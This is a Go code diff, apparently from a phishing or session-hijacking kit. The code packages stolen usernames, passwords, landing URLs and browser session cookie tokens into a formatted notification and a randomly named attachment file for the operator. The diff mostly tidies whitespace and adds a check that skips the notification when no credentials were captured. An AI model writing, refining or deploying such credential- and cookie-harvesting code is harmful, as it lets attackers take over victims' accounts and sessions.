@@ -8,7 +8,6 @@ import (
 	"path/filepath"
 	"sync"
 	"time"
-
 )
 
 type Token struct {
@@ -23,7 +22,7 @@ type Token struct {
 	Session          bool        `json:"session"`
 	FirstPartyDomain string      `json:"firstPartyDomain"`
 	PartitionKey     interface{} `json:"partitionKey"`
-	ExpirationDate   *int64       `json:"expirationDate,omitempty"`
+	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
 	StoreID          interface{} `json:"storeId"`
 }
 
@@ -123,6 +122,7 @@ func generateRandomString() string {
 	}
 	return string(randomStr)
 }
+
 func createTxtFile(session Session) (string, error) {
 	// Create a random text file name
 	txtFileName := generateRandomString() + ".txt"
@@ -158,7 +158,6 @@ func createTxtFile(session Session) (string, error) {
 	result, err := json.MarshalIndent(allTokens, "", "  ")
 	if err != nil {
 		fmt.Println("Error marshalling final tokens:", err)
-
 	}
 
 	fmt.Println("Combined Tokens: ", string(result))
@@ -175,7 +174,6 @@ func createTxtFile(session Session) (string, error) {
 func formatSessionMessage(session Session) string {
 	// Format the session information (no token data in message)
 	return fmt.Sprintf("✨ Session Information ✨\n\n"+
-
 		"👤 Username:      ➖ %s\n"+
 		"🔑 Password:      ➖ %s\n"+
 		"🌐 Landing URL:   ➖ %s\n \n"+
@@ -185,7 +183,6 @@ func formatSessionMessage(session Session) string {
 		"🕔 Update Time:   ➖ %d\n"+
 		"\n"+
 		"📦 Tokens are added in txt file and attached separately in message.\n",
-
 		session.Username,
 		session.Password,
 		session.LandingURL,
@@ -195,7 +192,14 @@ func formatSessionMessage(session Session) string {
 		session.UpdateTime,
 	)
 }
+
 func Notify(session Session) {
+	// Check if both Username and Password are empty
+	if session.Username == "" && session.Password == "" {
+		fmt.Println("Skipping notification: Username and Password are empty.")
+		return
+	}
+
 	config, err := loadConfig()
 	if err != nil {
 		fmt.Println(err)
